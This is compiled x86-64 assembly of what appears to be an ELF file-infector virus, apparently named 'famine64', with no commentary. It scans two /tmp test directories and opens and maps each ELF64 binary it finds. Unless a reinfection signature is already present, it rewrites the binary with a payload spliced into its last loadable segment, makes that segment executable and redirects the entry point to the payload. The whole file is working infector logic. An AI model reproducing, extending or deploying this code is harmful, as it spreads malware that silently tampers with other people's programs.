	.file	"main.c"
	.intel_syntax noprefix
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC0:
	.string	"OPEN file failed\n"
	.text
	.p2align 4,,15
	.globl	pack_dat_elf
	.type	pack_dat_elf, @function
pack_dat_elf:
.LFB38:
	.cfi_startproc
	cmp	BYTE PTR [rdx], 127
	je	.L35
.L33:
	ret
	.p2align 4,,10
	.p2align 3
.L35:
	cmp	BYTE PTR 1[rdx], 69
	jne	.L33
	cmp	BYTE PTR 2[rdx], 76
	jne	.L33
	cmp	BYTE PTR 3[rdx], 70
	jne	.L33
	cmp	BYTE PTR 4[rdx], 2
	jne	.L33
	cmp	BYTE PTR 5[rdx], 0
	je	.L33
	cmp	BYTE PTR 6[rdx], 1
	jne	.L33
	movzx	eax, BYTE PTR 16[rdx]
	sub	eax, 2
	cmp	al, 1
	ja	.L33
	movzx	ecx, WORD PTR 56[rdx]
	mov	r8, QWORD PTR 32[rdx]
	test	rcx, rcx
	je	.L33
	imul	rcx, rcx, 56
	push	r14
	.cfi_def_cfa_offset 16
	.cfi_offset 14, -16
	push	r13
	.cfi_def_cfa_offset 24
	.cfi_offset 13, -24
	push	r12
	.cfi_def_cfa_offset 32
	.cfi_offset 12, -32
	push	rbp
	.cfi_def_cfa_offset 40
	.cfi_offset 6, -40
	lea	rax, [rdx+r8]
	push	rbx
	.cfi_def_cfa_offset 48
	.cfi_offset 3, -48
	xor	r13d, r13d
	add	rcx, r8
	sub	rsp, 16
	.cfi_def_cfa_offset 64
	add	rcx, rdx
	jmp	.L5
	.p2align 4,,10
	.p2align 3
.L4:
	add	rax, 56
	cmp	rax, rcx
	je	.L36
.L5:
	cmp	DWORD PTR [rax], 1
	jne	.L4
	test	r13, r13
	je	.L15
	mov	rbx, QWORD PTR 16[r13]
	cmp	QWORD PTR 16[rax], rbx
	cmova	r13, rax
	jmp	.L4
.L36:
	test	r13, r13
	je	.L1
	mov	rax, QWORD PTR 40[r13]
	add	rax, QWORD PTR 8[r13]
	cmp	DWORD PTR -16[rdx+rax], 1120599618
	jne	.L17
	cmp	DWORD PTR -12[rdx+rax], 619686948
	jne	.L17
.L1:
	add	rsp, 16
	.cfi_remember_state
	.cfi_def_cfa_offset 48
	pop	rbx
	.cfi_restore 3
	.cfi_def_cfa_offset 40
	pop	rbp
	.cfi_restore 6
	.cfi_def_cfa_offset 32
	pop	r12
	.cfi_restore 12
	.cfi_def_cfa_offset 24
	pop	r13
	.cfi_restore 13
	.cfi_def_cfa_offset 16
	pop	r14
	.cfi_restore 14
	.cfi_def_cfa_offset 8
	ret
.L15:
	.cfi_restore_state
	mov	r13, rax
	jmp	.L4
.L17:
	mov	rbx, rdx
	xor	eax, eax
	mov	r12d, esi
	mov	rbp, rdi
	mov	rsi, rdi
	mov	edi, 87
	call	syscall@PLT
	movzx	eax, WORD PTR 60[rbx]
	mov	rdx, QWORD PTR 40[rbx]
	test	rax, rax
	je	.L37
	mov	r8, QWORD PTR 40[r13]
	mov	esi, DWORD PTR famine64_size[rip]
	sal	rax, 6
	add	r8, QWORD PTR 8[r13]
	add	rax, rdx
	lea	rcx, [rbx+rdx]
	add	rax, rbx
.L11:
	mov	rdi, QWORD PTR 24[rcx]
	cmp	rdi, r8
	jb	.L10
	add	rdi, rsi
	mov	QWORD PTR 24[rcx], rdi
.L10:
	add	rcx, 64
	cmp	rcx, rax
	jne	.L11
.L12:
	mov	rax, QWORD PTR 40[r13]
	add	rdx, rsi
	mov	rdi, QWORD PTR 24[rbx]
	mov	rcx, rax
	add	rcx, QWORD PTR 16[r13]
	mov	QWORD PTR 40[rbx], rdx
	mov	edx, DWORD PTR 4[r13]
	mov	QWORD PTR 8[rsp], rdi
	test	dl, 1
	mov	QWORD PTR 24[rbx], rcx
	jne	.L9
	or	edx, 1
	mov	DWORD PTR 4[r13], edx
.L9:
	add	rax, rsi
	mov	ecx, 493
	mov	edx, 65
	mov	QWORD PTR 40[r13], rax
	mov	QWORD PTR 32[r13], rax
	mov	rsi, rbp
	xor	eax, eax
	mov	edi, 2
	call	syscall@PLT
	cmp	eax, -1
	mov	r14, rax
	je	.L38
	mov	rsi, QWORD PTR 40[r13]
	mov	eax, DWORD PTR famine64_size[rip]
	mov	edi, r14d
	add	rsi, QWORD PTR 8[r13]
	sub	rsi, rax
	mov	rdx, rsi
	mov	rbp, rsi
	mov	rsi, rbx
	call	write@PLT
	test	rax, rax
	js	.L1
	mov	edx, DWORD PTR famine64_size[rip]
	mov	rsi, QWORD PTR famine64_func@GOTPCREL[rip]
	mov	edi, r14d
	sub	rdx, 8
	call	write@PLT
	test	rax, rax
	js	.L1
	lea	rsi, 8[rsp]
	mov	edx, 8
	mov	edi, r14d
	call	write@PLT
	test	rax, rax
	js	.L1
	movsx	rdx, r12d
	lea	rsi, [rbx+rbp]
	mov	edi, r14d
	sub	rdx, rbp
	call	write@PLT
	test	rax, rax
	js	.L1
	mov	esi, r14d
	mov	edi, 3
	xor	eax, eax
	call	syscall@PLT
	jmp	.L1
.L37:
	mov	esi, DWORD PTR famine64_size[rip]
	jmp	.L12
.L38:
	lea	rsi, .LC0[rip]
	mov	edx, 17
	mov	edi, 1
	call	write@PLT
	jmp	.L1
	.cfi_endproc
.LFE38:
	.size	pack_dat_elf, .-pack_dat_elf
	.section	.rodata.str1.1
.LC1:
	.string	"SEEK file failed\n"
.LC2:
	.string	"MMAP file failed\n"
	.text
	.p2align 4,,15
	.globl	get_dat_elf
	.type	get_dat_elf, @function
get_dat_elf:
.LFB37:
	.cfi_startproc
	push	r13
	.cfi_def_cfa_offset 16
	.cfi_offset 13, -16
	push	r12
	.cfi_def_cfa_offset 24
	.cfi_offset 12, -24
	push	rbp
	.cfi_def_cfa_offset 32
	.cfi_offset 6, -32
	push	rbx
	.cfi_def_cfa_offset 40
	.cfi_offset 3, -40
	sub	rsp, 1032
	.cfi_def_cfa_offset 1072
	movzx	edx, BYTE PTR [rdi]
	test	dl, dl
	je	.L49
	lea	r8, -1[rsp]
	mov	eax, 1
	.p2align 4,,10
	.p2align 3
.L41:
	mov	BYTE PTR [r8+rax], dl
	mov	ecx, eax
	add	rax, 1
	movzx	edx, BYTE PTR -1[rdi+rax]
	test	dl, dl
	jne	.L41
.L40:
	movzx	edx, BYTE PTR [rsi]
	test	dl, dl
	je	.L57
	movsx	rdi, ecx
	mov	eax, 1
	mov	rbx, rsp
	add	rdi, rsp
	.p2align 4,,10
	.p2align 3
.L43:
	mov	BYTE PTR -1[rdi+rax], dl
	mov	r8d, eax
	add	rax, 1
	movzx	edx, BYTE PTR -1[rsi+rax]
	test	dl, dl
	jne	.L43
	add	ecx, r8d
.L42:
	movsx	rcx, ecx
	xor	eax, eax
	mov	edx, 2050
	mov	BYTE PTR [rsp+rcx], 0
	mov	rsi, rbx
	xor	ecx, ecx
	mov	edi, 2
	call	syscall@PLT
	cmp	eax, -1
	mov	rbp, rax
	je	.L58
	mov	esi, eax
	mov	edx, 1
	xor	eax, eax
	mov	ecx, 2
	mov	edi, 8
	call	syscall@PLT
	test	eax, eax
	mov	r12, rax
	mov	edx, 17
	lea	rsi, .LC1[rip]
	jle	.L56
	sub	rsp, 8
	.cfi_def_cfa_offset 1080
	mov	edx, eax
	xor	esi, esi
	push	0
	.cfi_def_cfa_offset 1088
	xor	eax, eax
	mov	r9d, ebp
	mov	r8d, 2
	mov	ecx, 3
	mov	edi, 9
	call	syscall@PLT
	mov	r13, rax
	cmp	r13, -1
	pop	rax
	.cfi_def_cfa_offset 1080
	pop	rdx
	.cfi_def_cfa_offset 1072
	je	.L59
	mov	esi, ebp
	mov	edi, 3
	xor	eax, eax
	call	syscall@PLT
	mov	rdx, r13
	mov	esi, r12d
	mov	rdi, rbx
	call	pack_dat_elf
	mov	edx, r12d
	mov	rsi, r13
	mov	edi, 11
	xor	eax, eax
	call	syscall@PLT
	add	rsp, 1032
	.cfi_remember_state
	.cfi_def_cfa_offset 40
	pop	rbx
	.cfi_def_cfa_offset 32
	pop	rbp
	.cfi_def_cfa_offset 24
	pop	r12
	.cfi_def_cfa_offset 16
	pop	r13
	.cfi_def_cfa_offset 8
	ret
.L59:
	.cfi_restore_state
	lea	rsi, .LC2[rip]
	mov	edx, 17
.L56:
	mov	edi, 1
	call	write@PLT
	mov	esi, ebp
	mov	edi, 3
	xor	eax, eax
	call	syscall@PLT
	add	rsp, 1032
	.cfi_remember_state
	.cfi_def_cfa_offset 40
	pop	rbx
	.cfi_def_cfa_offset 32
	pop	rbp
	.cfi_def_cfa_offset 24
	pop	r12
	.cfi_def_cfa_offset 16
	pop	r13
	.cfi_def_cfa_offset 8
	ret
.L58:
	.cfi_restore_state
	lea	rsi, .LC0[rip]
	mov	edx, 17
	mov	edi, 1
	call	write@PLT
	add	rsp, 1032
	.cfi_remember_state
	.cfi_def_cfa_offset 40
	pop	rbx
	.cfi_def_cfa_offset 32
	pop	rbp
	.cfi_def_cfa_offset 24
	pop	r12
	.cfi_def_cfa_offset 16
	pop	r13
	.cfi_def_cfa_offset 8
	ret
.L49:
	.cfi_restore_state
	xor	ecx, ecx
	jmp	.L40
.L57:
	mov	rbx, rsp
	jmp	.L42
	.cfi_endproc
.LFE37:
	.size	get_dat_elf, .-get_dat_elf
	.p2align 4,,15
	.globl	find_files
	.type	find_files, @function
find_files:
.LFB36:
	.cfi_startproc
	push	r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	push	r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	xor	ecx, ecx
	push	r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	push	r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	mov	rsi, rdi
	push	rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	push	rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	xor	eax, eax
	mov	r13, rdi
	mov	edx, 591872
	mov	edi, 2
	sub	rsp, 1048
	.cfi_def_cfa_offset 1104
	call	syscall@PLT
	mov	QWORD PTR 8[rsp], rax
	mov	r14d, DWORD PTR 8[rsp]
	lea	r12, 16[rsp]
	cmp	r14d, -1
	je	.L60
	.p2align 4,,10
	.p2align 3
.L62:
	xor	eax, eax
	mov	ecx, 1024
	mov	rdx, r12
	mov	esi, r14d
	mov	edi, 217
	call	syscall@PLT
	test	eax, eax
	mov	r15d, eax
	jle	.L69
	xor	ebx, ebx
	jmp	.L64
	.p2align 4,,10
	.p2align 3
.L63:
	movsx	eax, BYTE PTR 32[rsp+rbp]
	add	ebx, eax
	cmp	r15d, ebx
	jle	.L62
.L64:
	movsx	rbp, ebx
	cmp	BYTE PTR 34[rsp+rbp], 8
	jne	.L63
	lea	rsi, 19[r12+rbp]
	mov	rdi, r13
	call	get_dat_elf
	jmp	.L63
.L69:
	mov	esi, DWORD PTR 8[rsp]
	mov	edi, 3
	xor	eax, eax
	call	syscall@PLT
.L60:
	add	rsp, 1048
	.cfi_def_cfa_offset 56
	pop	rbx
	.cfi_def_cfa_offset 48
	pop	rbp
	.cfi_def_cfa_offset 40
	pop	r12
	.cfi_def_cfa_offset 32
	pop	r13
	.cfi_def_cfa_offset 24
	pop	r14
	.cfi_def_cfa_offset 16
	pop	r15
	.cfi_def_cfa_offset 8
	ret
	.cfi_endproc
.LFE36:
	.size	find_files, .-find_files
	.section	.rodata.str1.1
.LC3:
	.string	"/tmp/test/"
.LC4:
	.string	"/tmp/test2/"
	.section	.text.startup,"ax",@progbits
	.p2align 4,,15
	.globl	main
	.type	main, @function
main:
.LFB35:
	.cfi_startproc
	lea	rdi, .LC3[rip]
	sub	rsp, 8
	.cfi_def_cfa_offset 16
	call	find_files
	lea	rdi, .LC4[rip]
	call	find_files
	xor	eax, eax
	add	rsp, 8
	.cfi_def_cfa_offset 8
	ret
	.cfi_endproc
.LFE35:
	.size	main, .-main
	.text
	.p2align 4,,15
	.globl	check_signature
	.type	check_signature, @function
check_signature:
.LFB39:
	.cfi_startproc
	mov	rdx, QWORD PTR 40[rsi]
	add	rdx, QWORD PTR 8[rsi]
	cmp	DWORD PTR -16[rdi+rdx], 1120599618
	sete	cl
	xor	eax, eax
	cmp	DWORD PTR -12[rdi+rdx], 619686948
	sete	al
	and	eax, ecx
	ret
	.cfi_endproc
.LFE39:
	.size	check_signature, .-check_signature
	.ident	"GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516"
	.section	.note.GNU-stack,"",@progbits
